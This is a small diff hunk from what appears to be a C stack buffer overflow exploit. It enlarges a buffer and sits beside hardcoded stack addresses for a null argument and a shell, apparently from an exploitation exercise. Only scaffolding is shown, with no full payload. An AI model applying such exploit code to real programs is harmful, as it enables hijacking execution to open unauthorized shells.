@@ -7,7 +7,7 @@
 
 int main(void)
 {
-  char bufr[155];
+  char bufr[184];
   // bufr address = bfbf57e5
   char null_arg_addr[] = "\x94\x58\xbf\xbf";
   char shell_addr[] = "\x98\x58\xbf\xbf";
